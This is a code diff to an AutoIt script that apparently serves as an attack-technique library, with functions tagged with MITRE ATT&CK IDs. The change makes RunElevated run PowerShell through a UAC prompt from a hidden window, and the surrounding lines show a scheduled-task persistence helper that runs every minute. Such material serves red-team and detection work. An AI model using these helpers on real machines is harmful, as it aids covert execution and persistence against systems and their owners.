@@ -18,9 +18,12 @@ Func HandleRelocation() ;DESCRIPTION:Call at entry point — if launched by Move
    If $sAction == $RELOC_DELETE Then FileDelete($sArg)
 EndFunc
 
-Func RunElevated($sPsCommand = 'cd..;cd..;dir;Read-Host -Prompt "Press Enter"') ;DESCRIPTION:Run a PowerShell command in an elevated process via UAC prompt;MITRE:Execution T1059.001,PrivilegeEscalation T1548.002
-   Local $sElevated = '"Start-Process powershell -Verb runAs ' & "'" & $sPsCommand & "'" & '"'
-   RunWait("powershell.exe -Command " & $sElevated)
+Func RunElevated($sPsCommand = 'cd ..; cd ..; dir; Read-Host -Prompt ''Press Enter''') ;DESCRIPTION:Run a PowerShell command in an elevated process via UAC prompt;MITRE:Execution T1059.001,PrivilegeEscalation T1548.002
+   Local $sEscaped = StringReplace($sPsCommand, "'", "''")
+   ; Use -ArgumentList to pass the command cleanly to the elevated process
+   ; -Wait makes Start-Process block until the elevated window closes
+   Local $sElevated = 'Start-Process powershell -Verb runAs -ArgumentList ''-NoExit'',''-Command'',''' & $sEscaped & ''' -Wait'
+   RunWait(@ComSpec & ' /c powershell.exe -Command "' & $sElevated & '"', "", @SW_HIDE)
 EndFunc
 
 Func CreateScheduledTask($sExePath) ;DESCRIPTION:Create a scheduled task that runs the given executable every minute;MITRE:Persistence T1053.005
